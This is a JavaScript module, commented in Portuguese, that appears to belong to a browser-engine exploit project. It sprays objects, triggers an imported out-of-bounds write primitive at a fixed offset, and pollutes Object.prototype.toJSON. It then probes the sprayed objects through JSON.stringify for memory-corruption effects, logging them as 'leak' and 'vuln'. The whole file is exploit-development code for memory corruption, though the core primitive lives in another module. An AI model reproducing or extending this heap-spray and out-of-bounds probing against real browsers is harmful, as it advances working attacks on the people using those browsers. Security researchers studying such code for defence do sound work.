// js/script3/testDiagnoseRangeErrorOnComplex.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

// Classe do objeto que demonstrou o RangeError
class MyComplexObjectForRECrash {
    constructor(id) {
        this.id_re = `MyObjRECrash-${id}`; // Nome de propriedade diferente para evitar colisões
        this.marker_re = 0xFEFEF00D;
        this.data_prop1 = "some_string_data_for_re_crash_test";
        this.data_prop2 = { nested: "complex_prop2_nested_re" };
        this.num_prop_A = 98765;
        this.num_prop_B = 43210;
        this.arr_prop_C = [5,4,3,2,1];
        // Adicionar mais algumas para o for...in ter o que iterar
        for(let i=0; i<5; i++) {
            this[`filler_RE_${i}`] = `filler_val_RE_${i}`;
        }
    }
}

// toJSON que tenta acessar this[prop] dentro do loop for...in, com logging DETALHADO
export function toJSON_DiagnoseForInRE() {
    const FNAME_toJSON = "toJSON_DiagnoseForInRE";
    let iteration_count_local = 0;
    const MAX_ITER_LOG_PROPS = 30;
    const MAX_ITER_SAFETY_BREAK = 100;

    let result_payload = {
        variant: FNAME_toJSON,
        id_at_entry: "N/A",
        iterations_done: 0,
        props_accessed_map: {},
        last_prop_attempted_access: "N/A",
        error_in_toJSON_logic: null,
        range_error_explicitly_caught_in_toJSON: false
    };

    try {
        const this_id_str = String(this?.id_re || this?.id || "ID_Desconhecido").substring(0,30);
        result_payload.id_at_entry = this_id_str;
        console.log(`[${FNAME_toJSON}] Entrando. this.id (aprox): ${this_id_str}`);
        logS3(`[${FNAME_toJSON}] Entrando. this.id (aprox): ${this_id_str}`, "info", FNAME_toJSON);
    } catch(e_id) { /* ignora */ }

    try {
        if (typeof this !== 'object' || this === null) {
            console.warn(`[${FNAME_toJSON}] 'this' não é um objeto ou é nulo no início do loop.`);
            result_payload.error_in_toJSON_logic = "this is not object or null at toJSON start";
            return result_payload;
        }

        for (const prop_name_str in this) {
            iteration_count_local++;
            result_payload.last_prop_attempted_access = String(prop_name_str);

            if (iteration_count_local <= MAX_ITER_LOG_PROPS) {
                console.log(`[${FNAME_toJSON}] Iter: ${iteration_count_local}, Raw Prop:`, prop_name_str);
                logS3(`  [${FNAME_toJSON}] Iter: ${iteration_count_local}, Tentando Prop: '${String(prop_name_str).substring(0,50)}'`, "info", FNAME_toJSON);
            }

            try {
                logS3(`   [${FNAME_toJSON}] Preparando para acessar this['${String(prop_name_str).substring(0,50)}']...`, "info", FNAME_toJSON);
                const prop_value = this[prop_name_str];

                if (iteration_count_local <= MAX_ITER_LOG_PROPS) {
                    let val_display_str = "N/A";
                    const val_type = typeof prop_value;
                    if (val_type !== 'function' && val_type !== 'object') {
                        val_display_str = String(prop_value).substring(0, 30);
                    } else if (Array.isArray(prop_value)) {
                        val_display_str = `[Array(${prop_value.length})]`;
                    } else if (val_type === 'object' && prop_value !== null) {
                        val_display_str = `[object ${prop_value.constructor?.name || ''}]`;
                    } else if (val_type === 'function') {
                        val_display_str = `[Function]`;
                    }
                    logS3(`    [${FNAME_toJSON}] Prop '${String(prop_name_str).substring(0,50)}' ACESSADA. Type: ${val_type}, Val: ${val_display_str}`, "good", FNAME_toJSON);
                    result_payload.props_accessed_map[String(prop_name_str).substring(0,50)] = `Type: ${val_type}, Val: ${val_display_str}`;
                }
            } catch (e_access) {
                console.error(`[${FNAME_toJSON}] ERRO AO ACESSAR this['${String(prop_name_str).substring(0,50)}']: ${e_access.name} - ${e_access.message}`, e_access);
                logS3(`    [${FNAME_toJSON}] ERRO AO ACESSAR this['${String(prop_name_str).substring(0,50)}']: ${e_access.name} - ${e_access.message}`, "error", FNAME_toJSON);
                result_payload.props_accessed_map[String(prop_name_str).substring(0,50)] = `ACCESS ERROR: ${e_access.name}`;
                throw e_access;
            }

            if (iteration_count_local >= MAX_ITER_SAFETY_BREAK) {
                logS3(`[${FNAME_toJSON}] Safety break: Excedeu ${MAX_ITER_SAFETY_BREAK} iterações. Última prop: '${String(prop_name_str).substring(0,100)}'.`, "warn", FNAME_toJSON);
                result_payload.error_in_toJSON_logic = `Safety break after ${MAX_ITER_SAFETY_BREAK} iter.`;
                break;
            }
        }
        logS3(`[${FNAME_toJSON}] Loop for...in completou ${iteration_count_local} iterações.`, "info", FNAME_toJSON);

    } catch (e_loop_or_rethrow) {
        console.error(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN (ou re-throw): ${e_loop_or_rethrow.name} - ${e_loop_or_rethrow.message}`, e_loop_or_rethrow);
        logS3(`[${FNAME_toJSON}] EXCEPTION NO LOOP FOR...IN (ou re-throw): ${e_loop_or_rethrow.name} - ${e_loop_or_rethrow.message}`, "critical", FNAME_toJSON);
        result_payload.error_in_toJSON_logic = `EXCEPTION in toJSON: ${e_loop_or_rethrow.name}: ${e_loop_or_rethrow.message}`;
        if (e_loop_or_rethrow.name === 'RangeError') {
            result_payload.range_error_explicitly_caught_in_toJSON = true;
        }
    }
    result_payload.iterations_completed_in_toJSON = iteration_count_local;
    console.log(`[${FNAME_toJSON}] Saindo. Iterações: ${iteration_count_local}. Payload:`, result_payload);
    return result_payload;
}


export async function executeDiagnoseRangeErrorOnComplexTest() {
    const FNAME_TEST = "executeDiagnoseRangeErrorOnComplexTest";
    logS3(`--- Iniciando Teste: Diagnóstico de RangeError em MyComplexObjectForRECrash ---`, "test", FNAME_TEST);
    document.title = `Diagnose RE on ComplexObj`;

    const spray_count = 5;
    const sprayed_objects = [];

    // <<< CORREÇÃO AQUI: Definir a variável com o nome correto
    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_trigger = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4; // Definido para uso na escrita

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObjectForRECrash...`, "info", FNAME_TEST);
    for (let i = 0; i < spray_count; i++) {
        sprayed_objects.push(new MyComplexObjectForRECrash(i));
    }
    logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST); // <<< CORREÇÃO AQUI
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        return;
    }

    try {
        // <<< CORREÇÃO AQUI: Usar corruption_offset_in_oob_ab e bytes_to_write_oob_val
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_trigger, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST); // <<< CORREÇÃO AQUI
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    await PAUSE_S3(SHORT_PAUSE_S3);

    logS3(`3. Sondando o primeiro MyComplexObjectForRECrash via JSON.stringify (usando Object.prototype.toJSON poluído)...`, "test", FNAME_TEST);

    const ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let problem_detected = false;
    const obj_to_probe = sprayed_objects[0];

    if (!obj_to_probe) {
        logS3("Nenhum objeto para sondar.", "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    try {
        Object.defineProperty(Object.prototype, ppKey_val, {
            value: toJSON_DiagnoseForInRE,
            writable: true, configurable: true, enumerable: false
        });
        toJSONPollutionApplied = true;
        logS3(`   Object.prototype.toJSON poluído com ${toJSON_DiagnoseForInRE.name}.`, "info", FNAME_TEST);

        logS3(`   Testando objeto 0 (ID: ${obj_to_probe.id_re})... ESPERANDO RangeError POTENCIAL.`, 'warn', FNAME_TEST);
        document.title = `Sondando ${obj_to_probe.id_re} (DiagnoseRE)`;
        try {
            console.log(`--- [${FNAME_TEST}] ANTES de JSON.stringify(obj_to_probe) ---`);
            const stringifyResult = JSON.stringify(obj_to_probe);
            console.log(`--- [${FNAME_TEST}] APÓS JSON.stringify(obj_to_probe) ---`);

            logS3(`     JSON.stringify(${obj_to_probe.id_re}) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST);
            if (stringifyResult && stringifyResult.range_error_explicitly_caught_in_toJSON) {
                 logS3(`     RangeError foi capturado DENTRO da toJSON. Verifique logs do console.`, "vuln", FNAME_TEST);
                 document.title = `RangeError CAUGHT in toJSON!`;
            } else if (stringifyResult && stringifyResult.error_in_toJSON_logic) {
                 logS3(`     Erro/Aviso na lógica da toJSON: ${stringifyResult.error_in_toJSON_logic}`, "warn", FNAME_TEST);
            } else {
                 logS3("     JSON.stringify completou sem RangeError explícito ou erro na toJSON.", "good", FNAME_TEST);
            }

        } catch (e_str) {
            console.error(`--- [${FNAME_TEST}] ERRO NO CATCH EXTERNO de JSON.stringify: ${e_str.name} ---`, e_str);
            logS3(`     !!!! ERRO AO STRINGIFY obj[0] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
            if (e_str.name === 'RangeError') {
                logS3(`       ---> RangeError: Maximum call stack size exceeded OCORREU! <---`, "vuln", FNAME_TEST);
                document.title = `RangeError REPRODUCED (Native)!`;
            }
            problem_detected = true;
        }

    } catch (e_main) {
        logS3(`Erro principal no teste: ${e_main.message}`, "error", FNAME_TEST);
        problem_detected = true;
    } finally {
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
    }

    if (!problem_detected) {
        logS3("RangeError NÃO ocorreu com a toJSON de diagnóstico detalhado.", "good", FNAME_TEST);
    }

    clearOOBEnvironment();
    logS3(`--- Teste Diagnóstico de RangeError em MyComplexObject CONCLUÍDO ---`, "test", FNAME_TEST);
    if (document.title.includes("REPRODUCED")) {
        // Manter
    } else if (!problem_detected) {
        document.title = `DiagnoseRE OK`;
    }
}
